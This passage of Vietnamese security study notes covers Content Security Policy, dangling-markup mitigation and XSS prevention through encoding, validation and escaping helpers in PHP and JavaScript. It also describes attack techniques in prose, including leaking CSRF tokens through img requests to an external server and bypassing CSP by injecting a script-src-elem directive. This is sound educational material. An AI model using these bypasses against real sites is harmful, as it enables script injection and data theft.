Ngoài ra, bạn cũng có thể giảm thiểu một số cuộc tấn công dangling markup bằng **Content Security Policy (CSP)**. Ví dụ, có thể ngăn chặn một số (nhưng không phải tất cả) cuộc tấn công bằng cách đặt chính sách chặn các thẻ như `<img>` tải tài nguyên từ bên ngoài.

> **Lưu ý**
> 
> 
> Trình duyệt **Chrome** đã quyết định xử lý tấn công dangling markup bằng cách **ngăn các thẻ như `<img>` định nghĩa URL chứa các ký tự thô (raw characters)**, chẳng hạn như dấu ngoặc nhọn `< >` hoặc ký tự xuống dòng. Điều này giúp ngăn chặn tấn công vì dữ liệu mà kẻ tấn công muốn thu thập thường chứa các ký tự này, khiến payload bị chặn.
> 

---

# CSP

---

## Khái niệm

---

CSP là một cơ chế bảo mật của trình duyệt nhằm giảm thiểu XSS và một số cuộc tấn công khác. Cơ chế này hoạt động bằng cách hạn chế các tài nguyên (như script và hình ảnh) mà một trang có thể tải, và hạn chế việc một trang có thể bị nhúng (framed) bởi các trang khác hay không.

Để bật CSP, response cần bao gồm HTTP header có tên **Content-Security-Policy** với giá trị là chính sách (policy). Bản thân policy bao gồm một hoặc nhiều **chỉ thị (directive)**, được phân tách bằng dấu chấm phẩy.

---

## Giảm tấn công XSS

---

Chỉ thị sau sẽ chỉ cho phép nạp script từ cùng nguồn (same origin) với chính trang đó:

```
script-src 'self'
```

Chỉ thị sau sẽ chỉ cho phép nạp script từ một miền (domain) cụ thể:

```
script-src https://scripts.normal-website.com
```

Cần thận trọng khi cho phép script từ các miền bên ngoài. Nếu có bất kỳ cách nào để kẻ tấn công kiểm soát nội dung được phục vụ từ miền bên ngoài đó, họ có thể thực hiện tấn công. Ví dụ, các mạng phân phối nội dung (CDN) không sử dụng URL riêng cho từng khách hàng (per-customer URLs), như ajax.googleapis.com, không nên được tin cậy, vì bên thứ ba có thể đưa nội dung của họ lên các miền này.

Ngoài việc đưa các miền cụ thể vào danh sách cho phép, Content Security Policy (CSP) cũng cung cấp hai cách khác để chỉ định tài nguyên tin cậy: nonce và hash:

- Chỉ thị CSP có thể chỉ định một nonce (giá trị ngẫu nhiên) và cùng giá trị này phải được dùng trong thẻ nạp script. Nếu các giá trị không khớp, script sẽ không thực thi. Để biện pháp này hiệu quả, nonce phải được tạo an toàn ở mỗi lần tải trang và không thể đoán được bởi kẻ tấn công.
- Chỉ thị CSP có thể chỉ định một hash của nội dung script tin cậy. Nếu hash của script thực tế không khớp với giá trị chỉ định trong chỉ thị, script sẽ không thực thi. Nếu nội dung script thay đổi, tất nhiên bạn sẽ cần cập nhật giá trị hash được chỉ định trong chỉ thị.

Việc CSP chặn các tài nguyên như script là khá phổ biến. Tuy nhiên, nhiều CSP vẫn cho phép các yêu cầu ảnh. Điều này có nghĩa là bạn thường có thể dùng phần tử `img` để gửi yêu cầu tới máy chủ bên ngoài nhằm làm lộ các token CSRF, chẳng hạn.

Một số trình duyệt, như Chrome, có cơ chế giảm thiểu “dangling markup” tích hợp sẵn, sẽ chặn các yêu cầu chứa một số ký tự nhất định, chẳng hạn như xuống dòng thô chưa mã hóa hoặc dấu ngoặc nhọn.

Một số chính sách hạn chế hơn và ngăn chặn mọi hình thức yêu cầu ra bên ngoài. Tuy nhiên, vẫn có thể vượt qua các hạn chế này bằng cách kích hoạt một số tương tác của người dùng. Để vượt qua dạng chính sách này, bạn cần chèn một phần tử HTML mà khi được nhấp, sẽ lưu trữ và gửi mọi thứ được bao trong phần tử đã chèn tới một máy chủ bên ngoài.

---

## Giảm tấn công **dangling markup**

---

Chỉ thị sau sẽ chỉ cho phép tải ảnh từ cùng nguồn (same origin) với chính trang đó:

```
img-src 'self'
```

Chỉ thị sau sẽ chỉ cho phép tải ảnh từ một miền (domain) cụ thể:

```
img-src https://images.normal-website.com
```

Lưu ý rằng các chính sách này sẽ ngăn chặn được một số khai thác **dangling markup**, bởi vì một cách đơn giản để thu thập dữ liệu mà không cần tương tác người dùng là dùng thẻ `img`. Tuy nhiên, chúng sẽ không ngăn chặn được các kiểu khai thác khác, chẳng hạn như chèn một thẻ `a` với thuộc tính `href` bị bỏ lửng (dangling).

---

## **Bypassing CSP with policy injection**

---

Bạn có thể gặp một website phản chiếu (reflect) dữ liệu đầu vào vào chính sách CSP, thường là trong chỉ thị `report-uri`. Nếu trang phản chiếu một tham số mà bạn có thể kiểm soát, bạn có thể tiêm thêm dấu chấm phẩy `;` để chèn chỉ thị CSP của riêng mình. Thông thường, `report-uri` là chỉ thị cuối cùng trong danh sách. Điều này có nghĩa là bạn sẽ cần ghi đè (overwrite) các chỉ thị đã tồn tại để khai thác lỗ hổng và vượt qua chính sách.

Bình thường, không thể ghi đè một chỉ thị `script-src` đã tồn tại. Tuy nhiên, gần đây Chrome đã giới thiệu chỉ thị **`script-src-elem`**, cho phép bạn kiểm soát các phần tử script (script elements) nhưng không kiểm soát được các sự kiện (events). Quan trọng là, chỉ thị mới này cho phép bạn ghi đè các `script-src` đã tồn tại.

Với kiến thức này, bạn có thể khai thác để vượt qua chính sách CSP và giải quyết lab sau.

[Lab: Reflected XSS protected by CSP, with CSP bypass | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

---

## Chống tấn công clickjacking

---

Chỉ thị sau sẽ chỉ cho phép trang được nhúng (framed) bởi các trang cùng nguồn (same origin):

```
frame-ancestors 'self'
```

Chỉ thị sau sẽ ngăn việc nhúng khung hoàn toàn:

```
frame-ancestors 'none'
```

Sử dụng Content Security Policy để ngăn clickjacking linh hoạt hơn so với dùng header `X-Frame-Options` vì bạn có thể chỉ định nhiều miền (domain) và dùng wildcard. Ví dụ:

```
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```

CSP cũng kiểm tra hợp lệ (validate) từng khung (frame) trong toàn bộ hệ phân cấp khung của trang cha, trong khi `X-Frame-Options` chỉ kiểm tra khung cấp cao nhất (top-level frame).

Khuyến nghị sử dụng CSP để bảo vệ khỏi các cuộc tấn công clickjacking. Bạn cũng có thể kết hợp với header `X-Frame-Options` để bảo vệ trên các trình duyệt cũ không hỗ trợ CSP, như Internet Explorer.

---

# Bảo mật

---

Trong phần này, chúng tôi sẽ mô tả một số nguyên tắc chung để ngăn chặn các lỗ hổng cross-site scripting (XSS) và các cách sử dụng những công nghệ phổ biến nhằm bảo vệ trước các cuộc tấn công XSS.

Việc phòng tránh XSS nhìn chung có thể đạt được thông qua hai lớp phòng thủ:

- Mã hóa (encode) dữ liệu khi xuất ra.
- Xác thực (validate) dữ liệu khi nhập vào.

Bạn có thể sử dụng Burp Scanner để quét các website của mình nhằm phát hiện nhiều lỗ hổng bảo mật, bao gồm cả XSS. Logic quét tiên tiến của Burp mô phỏng hành vi của một kẻ tấn công có kỹ năng và có thể đạt mức bao phủ cao tương ứng đối với các lỗ hổng XSS. Bạn có thể dùng Burp Scanner để có được sự bảo đảm rằng các biện pháp phòng vệ chống XSS của bạn đang hoạt động hiệu quả.

Tìm hiểu thêm về Burp Scanner.

---

## Encode data on output

---

Việc mã hóa cần được áp dụng **ngay trước khi dữ liệu do người dùng kiểm soát được ghi vào trang**, bởi vì ngữ cảnh (context) mà bạn đang ghi dữ liệu vào sẽ quyết định loại mã hóa cần dùng. Ví dụ: giá trị nằm trong chuỗi JavaScript cần một kiểu escape khác so với giá trị trong ngữ cảnh HTML.

- Trong ngữ cảnh HTML, bạn nên chuyển các giá trị không nằm trong danh sách cho phép thành các thực thể HTML (HTML entities):
    
    ```
    <  →  &lt;
    >  →  &gt;
    ```
    
- Trong ngữ cảnh chuỗi JavaScript, các ký tự không phải chữ và số nên được escape theo chuẩn Unicode:
    
    ```
    <  →  \u003c
    >  →  \u003e
    ```
    

Đôi khi, bạn sẽ cần áp dụng **nhiều lớp mã hóa** theo đúng thứ tự. Ví dụ, để nhúng an toàn dữ liệu người dùng vào bên trong một **trình xử lý sự kiện (event handler)**, bạn phải xử lý cả ngữ cảnh JavaScript lẫn HTML. Do đó, bạn cần **Unicode-escape** dữ liệu trước, sau đó **HTML-encode** nó:

```html
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```

👉 Đây là nguyên tắc quan trọng trong phòng chống XSS vì chỉ cần sai context hoặc thiếu một lớp escape, kẻ tấn công có thể chèn payload khai thác.

---

## Validate input on arrival

---

Mã hóa (encoding) là tuyến phòng thủ quan trọng nhất chống XSS, nhưng **chỉ mã hóa thôi thì chưa đủ** để ngăn chặn XSS trong mọi ngữ cảnh. Bạn cũng cần **xác thực dữ liệu** càng chặt chẽ càng tốt ngay tại thời điểm dữ liệu được nhận từ người dùng.

Ví dụ về xác thực dữ liệu đầu vào:

- Nếu người dùng gửi một URL sẽ được phản hồi trong response, hãy xác thực rằng URL đó bắt đầu bằng một giao thức an toàn như `http` hoặc `https`. Nếu không, kẻ tấn công có thể lợi dụng các giao thức nguy hiểm như `javascript:` hoặc `data:`.
- Nếu người dùng gửi một giá trị được kỳ vọng là số, hãy xác thực rằng giá trị đó thực sự là một số nguyên.
- Xác thực rằng dữ liệu đầu vào chỉ chứa tập ký tự cho phép (whitelisted characters).

Việc xác thực dữ liệu **nên hoạt động theo cơ chế chặn dữ liệu không hợp lệ**. Cách tiếp cận ngược lại – cố gắng “làm sạch” (sanitize) dữ liệu không hợp lệ để biến nó thành hợp lệ – dễ mắc lỗi và nên tránh nếu có thể.

---

### Whitelisting vs Blacklisting

---

- **Whitelisting (danh sách cho phép)**: Nên sử dụng whitelist thay vì blacklist.
    - Ví dụ: thay vì cố gắng lập danh sách tất cả các giao thức nguy hiểm (`javascript:`, `data:`, …), hãy lập danh sách giao thức an toàn (`http`, `https`) và chặn mọi thứ không nằm trong danh sách.
- **Blacklisting (danh sách chặn)**: Thường kém an toàn, dễ bị vượt qua bởi các kỹ thuật **obfuscation** (làm mờ/ẩn payload) hoặc khi xuất hiện các giao thức nguy hiểm mới chưa có trong danh sách chặn.

👉 Tóm lại: **Mã hóa để ngăn khai thác, xác thực để giảm rủi ro từ đầu vào không hợp lệ.**

---

## Allowing “safe” HTML

---

Việc cho phép người dùng đăng mã HTML nên được tránh nếu có thể, nhưng đôi khi đó là yêu cầu nghiệp vụ. Ví dụ, một trang blog có thể cho phép đăng bình luận chứa một số HTML giới hạn.

Cách tiếp cận kinh điển là cố gắng lọc bỏ các thẻ và JavaScript có khả năng gây hại. Bạn có thể cố gắng triển khai điều này bằng một danh sách trắng (whitelist) các thẻ và thuộc tính an toàn, nhưng do sự khác biệt giữa các engine phân tích cú pháp của trình duyệt và những “quirk” như mutation XSS, cách này cực kỳ khó triển khai một cách an toàn.

Lựa chọn “ít tệ nhất” là dùng một thư viện JavaScript thực hiện lọc và mã hóa ngay trên trình duyệt của người dùng, chẳng hạn DOMPurify. Các thư viện khác cho phép người dùng cung cấp nội dung dưới dạng markdown rồi chuyển đổi markdown sang HTML. Đáng tiếc, đôi khi tất cả các thư viện này đều có lỗ hổng XSS, nên đây không phải giải pháp hoàn hảo. Nếu bạn sử dụng, hãy theo dõi sát các bản cập nhật bảo mật.

> Ghi chú
Ngoài JavaScript, những nội dung khác như CSS và thậm chí HTML thông thường cũng có thể gây hại trong một số tình huống.
> 

---

## **Template engine**

---

Nhiều website hiện đại sử dụng các template engine phía máy chủ như Twig và FreeMarker để nhúng nội dung động vào HTML. Các engine này thường định nghĩa cơ chế escape riêng. Ví dụ, trong Twig, bạn có thể dùng bộ lọc `e()` với một tham số xác định ngữ cảnh:

```
{{ user.firstname | e('html') }}
```

Một số template engine khác, như Jinja và React, mặc định sẽ escape nội dung động, nhờ đó ngăn chặn hiệu quả phần lớn các trường hợp XSS.

Chúng tôi khuyến nghị bạn xem xét kỹ các tính năng escape khi đánh giá việc sử dụng một template engine hay framework cụ thể.

> Ghi chú
> 
> 
> Nếu bạn nối trực tiếp dữ liệu người dùng vào chuỗi template, bạn sẽ dễ bị tấn công chèn template phía máy chủ (server-side template injection), thường nghiêm trọng hơn cả XSS.
> 

---

## PHP

---

Trong PHP có hàm dựng sẵn để mã hóa thực thể (entities) là `htmlentities`. Bạn nên gọi hàm này để escape dữ liệu đầu vào khi ở **ngữ cảnh HTML**. Hàm nên được gọi với ba tham số:

1. Chuỗi đầu vào của bạn.
2. `ENT_QUOTES`, cờ chỉ định mã hóa tất cả dấu nháy (quote).
3. Bộ ký tự (charset), trong hầu hết trường hợp nên là `UTF-8`.

Ví dụ:

```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?>
```

Khi ở **ngữ cảnh chuỗi JavaScript**, bạn cần Unicode-escape dữ liệu đầu vào như đã mô tả. Đáng tiếc, PHP không cung cấp API để Unicode-escape một chuỗi. Dưới đây là một đoạn mã PHP để thực hiện việc này:

```php
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i=0;$i<count($str);$i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= '\u2028';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= '\u2029';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
            break;
            default:
                $output .= $str[$i];
            break;
        }
    }
    return $output;
}
?>
```

Cách sử dụng hàm `jsEscape` trong PHP:

```html
<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
```

Ngoài ra, bạn cũng có thể sử dụng một template engine.

---

## JavaScript

---

Để escape dữ liệu người dùng trong ngữ cảnh HTML bằng JavaScript, bạn cần bộ mã hóa HTML riêng vì JavaScript không cung cấp API để mã hóa HTML. Dưới đây là ví dụ mã JavaScript chuyển một chuỗi thành các thực thể HTML:

```jsx
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
```

Bạn sẽ dùng hàm này như sau:

```html
<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>
```

Nếu dữ liệu đầu vào nằm trong ngữ cảnh chuỗi JavaScript, bạn cần một bộ mã hóa thực hiện Unicode escaping. Dưới đây là ví dụ bộ mã hóa Unicode:

```jsx
function jsEscape(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

Bạn sẽ dùng hàm này như sau:

```html
<script>document.write('<script>x="'+jsEscape(untrustedValue)+'";<\/script>')</script>
```

---

## jQuery

---

Hình thức XSS phổ biến nhất trong jQuery là khi bạn truyền đầu vào của người dùng vào **jQuery selector**. Các lập trình viên web thường dùng `location.hash` và truyền nó vào selector, dẫn đến XSS vì jQuery sẽ render HTML. jQuery đã nhận ra vấn đề này và vá logic selector để kiểm tra xem đầu vào có bắt đầu bằng dấu **#** hay không. Hiện nay, jQuery chỉ render HTML nếu ký tự đầu tiên là dấu **<**. Nếu bạn truyền dữ liệu không tin cậy vào jQuery selector, hãy đảm bảo bạn **escape** giá trị đúng cách bằng hàm `jsEscape` ở trên.

---

## CSP

---

Content security policy (CSP) là tuyến phòng thủ cuối cùng chống lại cross-site scripting. Nếu biện pháp phòng chống XSS của bạn thất bại, bạn có thể dùng CSP để giảm thiểu XSS bằng cách hạn chế những gì kẻ tấn công có thể làm.

CSP cho phép bạn kiểm soát nhiều thứ, chẳng hạn như liệu có thể tải script bên ngoài hay không và liệu các script nội tuyến có được thực thi hay không. Để triển khai CSP, bạn cần thêm một HTTP response header có tên `Content-Security-Policy` với giá trị chứa chính sách của bạn.

Ví dụ về một CSP như sau:

```
default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```

Chính sách này chỉ ra rằng các tài nguyên như ảnh và script chỉ có thể được tải từ cùng nguồn (same origin) với trang chính. Vì vậy, ngay cả khi kẻ tấn công có thể chèn payload XSS thành công, họ cũng chỉ có thể tải tài nguyên từ origin hiện tại. Điều này làm giảm đáng kể khả năng kẻ tấn công khai thác lỗ hổng XSS.

Nếu bạn cần tải tài nguyên bên ngoài, hãy đảm bảo rằng bạn chỉ cho phép các script không hỗ trợ kẻ tấn công khai thác trang web của bạn. Ví dụ, nếu bạn đưa một số miền vào danh sách trắng, thì kẻ tấn công có thể tải bất kỳ script nào từ các miền đó. Khi có thể, hãy cố gắng lưu trữ tài nguyên trên miền của riêng bạn.

Nếu điều đó không khả thi, bạn có thể sử dụng chính sách dựa trên hash hoặc nonce để cho phép các script trên miền khác. Nonce là một chuỗi ngẫu nhiên được thêm như một thuộc tính của script hoặc tài nguyên, chỉ được thực thi nếu chuỗi ngẫu nhiên đó khớp với chuỗi do máy chủ tạo ra. Kẻ tấn công không thể đoán được chuỗi ngẫu nhiên này và do đó không thể gọi một script hoặc tài nguyên với nonce hợp lệ, vì vậy tài nguyên sẽ không được thực thi.
